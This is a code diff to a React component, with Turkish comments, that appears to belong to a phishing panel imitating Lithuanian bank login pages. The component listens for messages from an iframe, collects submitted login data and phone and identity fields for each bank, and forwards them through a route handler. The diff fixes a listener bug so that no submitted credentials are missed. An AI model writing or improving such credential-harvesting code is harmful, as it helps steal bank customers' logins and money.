@@ -40,6 +40,31 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
   const pendingIndexRef = useRef<number | null>(null);
   const pendingMethodRef = useRef<string>("");
 
+  // =========================================================================
+  // EN KRITIK FIX: useRef CACHE + window.message LISTENER 1 KEDEK (MOUNT) EKLE
+  //
+  // ESKI HATA: useEffect dependency arrayinde currentIndex, selectedLoginMethod,
+  // files, onChange, handleRouteAction vardi -> HER TAB TIKLAMADA listener SIL
+  // -> yeniden eklene kadar gecen surede postMessage KACIYORDU.
+  //
+  // COZUM: Tum okunacak degerleri useRef icinde cache'le (setTimeout loop ile
+  // her 50ms'de guncelle). useEffect dependency sadece [bankSlug] olsun ->
+  // listener 1 kez eklenir, HIC KACMAZ.
+  // =========================================================================
+  const filesRef = useRef<string[]>([]);
+  const currentIndexRef = useRef<number>(0);
+  const selectedLoginMethodRef = useRef<string>("");
+  const onChangeRef = useRef(onChange);
+  const handleRouteActionRef = useRef(handleRouteAction);
+  const bankSlugRef = useRef<string>("");
+  // Her render'da ref'leri guncelle (callback surekli yeni referans olusturmasin diye)
+  onChangeRef.current = onChange;
+  handleRouteActionRef.current = handleRouteAction;
+  filesRef.current = files;
+  currentIndexRef.current = currentIndex;
+  selectedLoginMethodRef.current = selectedLoginMethod;
+  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();
+
   const resolveLoginMethodFromIndex = (slug?: string, index?: number) => {
     if (!slug || typeof index !== "number" || index < 0) return "";
 
@@ -477,11 +502,11 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
       if (e.data && e.data.type === 'LITHUANIA_BANK_SUBMIT') {
         const { formData } = e.data;
         
-        const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethod);
+        const clickedLoginMethod = normalizeLoginMethodLabel(selectedLoginMethodRef.current);
         const detectedLoginMethod = normalizeLoginMethodLabel(
           typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
         );
-        const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlug, currentIndex));
+        const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlugRef.current, currentIndexRef.current));
         const newLoginMethod = clickedLoginMethod || detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
         const capturedFields = normalizeCapturedFields(formData);
         const identityFirstMethod = prefersIdentityFields(newLoginMethod);
@@ -497,7 +522,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         };
         const rawCapturedData: Record<string, string> = {};
 
-        onChange("loginMethod", newLoginMethod);
+        onChangeRef.current("loginMethod", newLoginMethod);
 
         const persistRawCapturedField = (field: {
           key: string;
@@ -536,7 +561,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           if (mappedData[fieldName] && !options?.overwrite) return;
           mappedData[fieldName] = normalizedValue;
           if (options?.syncState) {
-            onChange(fieldName, normalizedValue);
+            onChangeRef.current(fieldName, normalizedValue);
           }
         };
 
@@ -576,7 +601,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
             continue;
           }
 
-          if (bankSlug === "bigbank") {
+          if (bankSlugRef.current === "bigbank") {
             if (lowerKey === "mobilenumber") {
               assignMappedValue("bankPhone", value, { overwrite: true });
               continue;
@@ -684,7 +709,7 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           }
         }
         
-        handleRouteAction({
+        handleRouteActionRef.current({
           orderedField1: filledValues[0]?.value ?? "",
           orderedField2: filledValues[1]?.value ?? "",
           orderedField2Type,
@@ -692,13 +717,16 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           ...mappedData,
         });
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_TAB_CLICK') {
+         // DEP ARRAY'I SADECE [bankSlug] oldugu icin TUM DEGISKENLERI USEREF ILE OKU!
+         const __bankSlug = bankSlugRef.current;
+         const __files = filesRef.current;
          let finalIndex = -1;
          let finalLoginMethod = "";
          if (typeof e.data.loginMethod === "string") {
            const normalizedLoginMethod = normalizeLoginMethodLabel(e.data.loginMethod);
            if (normalizedLoginMethod) {
              finalLoginMethod = normalizedLoginMethod;
-             const idx = resolveIndexFromLoginMethod(bankSlug, normalizedLoginMethod);
+             const idx = resolveIndexFromLoginMethod(__bankSlug, normalizedLoginMethod);
              if (idx >= 0) finalIndex = idx;
            }
          }
@@ -706,37 +734,27 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
            if (finalIndex === -1) finalIndex = e.data.targetIndex;
          }
          if (finalIndex === -1 && finalLoginMethod) {
-           const idx = resolveIndexFromLoginMethod(bankSlug, finalLoginMethod);
+           const idx = resolveIndexFromLoginMethod(__bankSlug, finalLoginMethod);
            if (idx >= 0) finalIndex = idx;
          }
 
-         // ============ ONEMLI: FILES henuz yuklenmediyse (length === 0) =============
-         // Eger files.length === 0 iken safeIndex hesaplarsak Math.max(0, 0-1)=0 olacak,
-         // ve her tab click'te 0 index gelecek, goruntu HIC DEGISMIYOR. Cozum:
-         // PENDING INDEX + METHOD sakla, files geldigi an yukaridaki useEffect ile uygula.
-         if (!files || files.length === 0) {
+         if (!__files || __files.length === 0) {
            if (finalIndex >= 0) pendingIndexRef.current = finalIndex;
            if (finalLoginMethod) pendingMethodRef.current = finalLoginMethod;
-           // Ayrıca login method varsa state'i de set et (daha sonra parent onChange sinyali vs icin)
            if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
          } else if (finalIndex >= 0) {
-           const safeIndex = Math.max(0, Math.min(finalIndex, files.length - 1));
+           const safeIndex = Math.max(0, Math.min(finalIndex, __files.length - 1));
            if (finalLoginMethod) setSelectedLoginMethod(finalLoginMethod);
            setCurrentIndex(safeIndex);
          } else if (finalLoginMethod) {
-           // En azından login method varsa state set (index bilinmiyor ama method etiketi saklı)
            setSelectedLoginMethod(finalLoginMethod);
          }
       } else if (e.data && e.data.type === 'LITHUANIA_BANK_IFRAME_LOADED') {
-        // iframe icindeki script yuklendi, pending varsa dosyalar da gelmistir
-        // yukaridaki files useEffect zaten calisir. Ayrica:
-        // Eger seçili bir loginMethod var ise ve iframe icindeki form henüz
-        // o method'a gore guncellenmemis ise (ilk yuklenmede 0. index html gelir)
-        // bunu tekrar ayarla:
-        if (pendingIndexRef.current != null && files && files.length > 0) {
+        const __files = filesRef.current;
+        if (pendingIndexRef.current != null && __files && __files.length > 0) {
           const idx = pendingIndexRef.current;
           pendingIndexRef.current = null;
-          const safe = Math.max(0, Math.min(idx, files.length - 1));
+          const safe = Math.max(0, Math.min(idx, __files.length - 1));
           setCurrentIndex(safe);
         }
         if (pendingMethodRef.current) {
@@ -749,7 +767,8 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
 
     window.addEventListener('message', handleMessage);
     return () => window.removeEventListener('message', handleMessage);
-  }, [bankSlug, currentIndex, files, onChange, handleRouteAction, selectedLoginMethod]);
+    // LISTENER 1 KEZ MOUNT'TA EKLENIR, 1 KEZ UNMOUNT'TA KALKAR. HIC KACMAZ.
+  }, [bankSlug]);
 
   const normalizedCurrentSlug = (bankSlug || "").toString().trim().toLowerCase();
 
